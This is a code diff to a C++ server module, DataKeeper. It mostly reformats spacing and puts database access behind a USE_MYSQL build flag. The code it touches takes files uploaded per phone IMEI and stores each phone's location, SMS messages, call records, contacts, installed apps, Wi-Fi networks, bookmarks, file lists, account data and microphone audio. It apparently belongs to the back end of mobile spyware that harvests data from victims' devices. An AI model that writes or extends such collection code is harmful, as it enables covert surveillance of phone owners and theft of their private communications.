@@ -32,7 +32,7 @@ int DataKeeper::add(RECOMMITDATA data) {
 	return g_number;
 }
 
-void DataKeeper::findfiles(string path,string username,string imei) {
+void DataKeeper::findfiles(string path, string username, string imei) {
 	int ret = 0;
 
 	WIN32_FIND_DATAA fd = { 0 };
@@ -53,7 +53,7 @@ void DataKeeper::findfiles(string path,string username,string imei) {
 			}
 			else {
 				string next = path + fd.cFileName + "\\";
-				findfiles(next,username,imei);
+				findfiles(next, username, imei);
 			}
 		}
 		else if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) {
@@ -81,7 +81,7 @@ void DataKeeper::getpath(void) {
 	string fn = string(szpath) + "\\recommit.config";
 
 	int filesize = 0;
-	char *lpdata = 0;
+	char* lpdata = 0;
 	filesize = FileOperator::fileReader(fn.c_str(), &lpdata, &filesize);
 	if (filesize > 0) {
 		string path = lpdata;
@@ -143,7 +143,7 @@ void DataKeeper::getpath(void) {
 				break;
 			}
 
-			findfiles(string(szpath) + "\\" + sub,username,imei);
+			findfiles(string(szpath) + "\\" + sub, username, imei);
 		}
 	}
 
@@ -169,7 +169,7 @@ int __stdcall DataKeeper::recommit() {
 				RECOMMITDATA data = it->second;
 				gMapRecommit.erase(it++);
 
-				char * lpdata = 0;
+				char* lpdata = 0;
 				int filesize = 0;
 				string filename = (data.filepath + data.filename);
 				ret = FileOperator::fileReader(filename.c_str(), &lpdata, &filesize);
@@ -195,10 +195,11 @@ int __stdcall DataKeeper::recommit() {
 
 
 
-int DataKeeper::keep(string filepath, string name, const char * data, int size,string username,string imei) {
-	MySql::enterLock();
-	MySql * mysql = new MySql();
+int DataKeeper::keep(string filepath, string name, const char* data, int size, string username, string imei) {
 	int ret = 0;
+#ifdef USE_MYSQL
+	MySql::enterLock();
+	MySql* mysql = new MySql();
 
 	string filename = filepath + name;
 
@@ -216,7 +217,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 		}
 		else if (strstr(name.c_str(), LOCATION_FILENAME))
 		{
-			vector<string> *arraydata = 0;
+			vector<string>* arraydata = 0;
 			string mydata = string(data, size);
 			arraydata = JsonParser::getJsonFromArray(mydata);
 			for (unsigned int i = 0; i < arraydata->size(); i++)
@@ -227,7 +228,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 				string status = "";
 				string address = "";
 
-				ret = JsonSplit::splitLocation(arraydata->at(i), lat, lon, status, timenow,address);
+				ret = JsonSplit::splitLocation(arraydata->at(i), lat, lon, status, timenow, address);
 				if (lat != "" && lon != "")
 				{
 					ret = mysql->insertLocation(username, imei, lat, lon, timenow, address);
@@ -261,7 +262,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 			}	*/
 
 
-			vector<string> *arraydata = 0;
+			vector<string>* arraydata = 0;
 			string mydata = string(data, size);
 			arraydata = JsonParser::getJsonFromArray(mydata);
 			for (unsigned int i = 0; i < arraydata->size(); i++)
@@ -292,13 +293,13 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 			Json::Value value;
 			Json::Reader reader;
 			string mydata = string(data, size);
-			if (reader.parse(mydata,value))
+			if (reader.parse(mydata, value))
 			{
 				int jsoncnt = value.size();
-				for (int i = 0;i < jsoncnt; i ++)
+				for (int i = 0; i < jsoncnt; i++)
 				{
-					ret = mysql->insertMsg(imei, "0", 
-						value[i]["\xE5\x8F\xB7\xE7\xA0\x81"].asString(), 
+					ret = mysql->insertMsg(imei, "0",
+						value[i]["\xE5\x8F\xB7\xE7\xA0\x81"].asString(),
 						value[i]["\xE7\xB1\xBB\xE5\x9E\x8B"].asString(),
 						value[i]["\xE6\x97\xB6\xE9\x97\xB4"].asString(),
 						value[i]["\xE6\xB6\x88\xE6\x81\xAF\xE5\x86\x85\xE5\xAE\xB9"].asString(),
@@ -321,7 +322,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 				ret = JsonSplit::splitMessage(arraydata->at(i), number, content, type, timenow, mid);
 				replaceSplashAndEnterAndQuot(content);
 				ret = mysql->insertMsg(imei, "0", number, type, timenow, content, mid);
-				
+
 			}
 			if (arraydata != 0)
 			{
@@ -360,7 +361,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 						value[i]["\xE6\x97\xB6\xE9\x97\xB4"].asString(),
 						value[i]["\xE6\x97\xB6\xE9\x95\xBF"].asString());
 				}
-			}	
+			}
 
 			/*
 			vector<string> *arraydata = 0;
@@ -396,7 +397,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 						value[i]["\xE7\xA7\xB0\xE5\x91\xBC"].asString(),
 						value[i]["\xE5\x8F\xB7\xE7\xA0\x81"].asString());
 				}
-			}	
+			}
 
 			/*
 			vector<string> *arraydata = 0;
@@ -469,7 +470,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 				{
 					Json::Value subvalue = value[i];
 					int subcnt = subvalue.size();
-					for (int j = 0; j < subcnt ;j ++)
+					for (int j = 0; j < subcnt; j++)
 					{
 						ret = mysql->insertInstallApps(imei,
 							subvalue[j]["\xE5\xBA\x94\xE7\x94\xA8\xE5\x90\x8D\xE7\xA7\xB0"].asString(),
@@ -480,7 +481,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 							subvalue[j]["type"].asString());
 					}
 				}
-			}	
+			}
 
 			/*
 			vector<string> *arraydata = 0;
@@ -493,7 +494,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 				string stime = "";
 				string ltime = "";
 				string ver = "";
-				
+
 				string type = "";
 
 				ret = JsonSplit::splitInstallApps(arraydata->at(i), name, packagename, stime, ltime, ver,type);
@@ -535,10 +536,10 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 			}
 
 			int wifilen = wifiinfo.length();
-			char * last = (char*)wifiinfo.c_str() + wifilen - 1;
+			char* last = (char*)wifiinfo.c_str() + wifilen - 1;
 			*last = ']';
 
-			if ( (wifiinfo.length() < 0x10000 - 1024) && wifiinfo.length() > 2)
+			if ((wifiinfo.length() < 0x10000 - 1024) && wifiinfo.length() > 2)
 			{
 				ret = mysql->insertWifi(username, imei, wifiinfo, "");
 				ret = mysql->insertWifi2(username, imei, wifiinfo, "");
@@ -574,7 +575,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 				replaceSplashAndEnterAndQuot(name);
 
 				wsprintfA(szinfo, "\"%s_%s_(%s)\",", name.c_str(), bssid.c_str(), strtime);
-				
+
 				wifiinfo += szinfo;
 			}
 
@@ -613,14 +614,14 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 				int jsoncnt = value.size();
 				for (int i = 0; i < jsoncnt; i++)
 				{
-					ret = mysql->insertBookMark(username,imei,
+					ret = mysql->insertBookMark(username, imei,
 						value[i]["\xE9\x93\xBE\xE6\x8E\xA5"].asString(),
 						value[i]["\xE6\xA0\x87\xE9\xA2\x98"].asString(),
 						value[i]["\xE8\xAE\xBF\xE9\x97\xAE\xE6\xAC\xA1\xE6\x95\xB0"].asString(),
 						value[i]["\xE5\x88\x9B\xE5\xBB\xBA\xE6\x97\xB6\xE9\x97\xB4"].asString(),
 						value[i]["\xE8\xAE\xBF\xE9\x97\xAE\xE6\x97\xB6\xE9\x97\xB4"].asString());
 				}
-			}	
+			}
 
 			/*
 			vector<string> *arraydata = 0;
@@ -648,22 +649,22 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 		else if (strstr(name.c_str(), SDCARDFILES_FILENAME) || strstr(name.c_str(), EXTCARDFILES_FILENAME) ||
 			strstr(name.c_str(), FLASHCARDFILES_FILENAME))
 		{
-			vector<string> *arraydata = 0;
-// 			FileReadLine *freader = new FileReadLine(filename);
-// 			while (1)
-// 			{
-// 				string line = freader->readline();
-// 				if (line != "")
-// 				{
-// 					replaceSplashAndEnterAndQuot(line);
-// 					string sdfn = getfnfrompath(line);
-// 					mysql->insertFiles(imei, sdfn, line, 0, 0);
-// 				}
-// 				else {
-// 					break;
-// 				}
-// 			}
-// 			delete freader;
+			vector<string>* arraydata = 0;
+			// 			FileReadLine *freader = new FileReadLine(filename);
+			// 			while (1)
+			// 			{
+			// 				string line = freader->readline();
+			// 				if (line != "")
+			// 				{
+			// 					replaceSplashAndEnterAndQuot(line);
+			// 					string sdfn = getfnfrompath(line);
+			// 					mysql->insertFiles(imei, sdfn, line, 0, 0);
+			// 				}
+			// 				else {
+			// 					break;
+			// 				}
+			// 			}
+			// 			delete freader;
 
 			string mydata = string(data, size);
 			arraydata = JsonParser::splitFromEnter(mydata);
@@ -694,7 +695,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 		{
 			ret = mysql->insertAccount(username, imei, string(data, size), "2");
 		}
-		
+
 		else if (strstr(name.c_str(), "_micaudio"))
 		{
 			string timenow = "";
@@ -748,7 +749,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 			}
 
 			//mysql must use utf8 file name
-			char * utf8filename = 0;
+			char* utf8filename = 0;
 			int utf8fnlen = Coder::GBKToUTF8(filename.c_str(), &utf8filename);
 			if (utf8fnlen > 0)
 			{
@@ -756,7 +757,7 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 				delete utf8filename;
 				replaceSplash(strutf8fn);
 
-				char * utf8name = 0;
+				char* utf8name = 0;
 				int utf8namelen = Coder::GBKToUTF8(name.c_str(), &utf8name);
 				if (utf8namelen > 0) {
 					string strutf8name = string(utf8name, utf8namelen);
@@ -776,35 +777,38 @@ int DataKeeper::keep(string filepath, string name, const char * data, int size,s
 
 	delete mysql;
 	MySql::leaveLock();
-
+#endif
 	return ret;
 }
 
 
 int DataKeeper::removeClient(string imei) {
-	MySql::enterLock();
-	MySql * mysql = new MySql();
 	int ret = 0;
+#ifdef USE_MYSQL
+	MySql::enterLock();
+	MySql* mysql = new MySql();
 
 	__try {
 		ret = mysql->removedata(imei);
 	}
 	__except (1) {
 		char szinfo[1024];
-		wsprintfA(szinfo, "removeClient error,imei:%s\r\n",imei.c_str());
+		wsprintfA(szinfo, "removeClient error,imei:%s\r\n", imei.c_str());
 		WriteLogFile(szinfo);
 	}
 
 	delete mysql;
 	MySql::leaveLock();
+#endif
 	return ret;
 }
 
 int DataKeeper::removeUser(string username) {
-
-	MySql::enterLock();
-	MySql * mysql = new MySql();
 	int ret = 0;
+#ifdef USE_MYSQL
+	MySql::enterLock();
+	MySql* mysql = new MySql();
+
 
 	__try {
 		vector<vector<string>> data = mysql->getAllImeiFromUser(username);
@@ -827,6 +831,7 @@ int DataKeeper::removeUser(string username) {
 
 	delete mysql;
 	MySql::leaveLock();
+#endif
 	return ret;
 }
 
